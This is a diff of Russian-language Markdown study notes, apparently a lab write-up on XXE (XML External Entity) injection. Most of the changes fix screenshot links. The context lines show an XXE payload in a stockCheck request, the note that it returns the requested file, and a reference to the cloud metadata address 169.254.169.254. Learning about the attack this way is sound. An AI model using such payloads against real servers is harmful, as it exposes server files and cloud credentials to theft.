@@ -19,8 +19,8 @@ http://169.254.169.254/ - точка получение метаданных
 ----
 
 ==MIME type = text==
-<img src="../../assets/" alt="Скрин" style="width: 90%; max-width: 1000px;" />
-![[Снимок экранаXML_(XXE)22.01.103.png]]
+<img src="../../assets/Снимок экранаXML_(XXE)22.01.103.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
+
 поменял запрос 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -28,8 +28,9 @@ http://169.254.169.254/ - точка получение метаданных
 <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
 ```
 возвращает запрашиваемый файл!  xxe подтверждена!!!
-<img src="../../assets/" alt="Скрин" style="width: 90%; max-width: 1000px;" />
-![[СнимокXML_(XXE)21.33.336.png]]
+
+<img src="../../assets/СнимокXML_(XXE)21.33.336.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
+
 
 
 
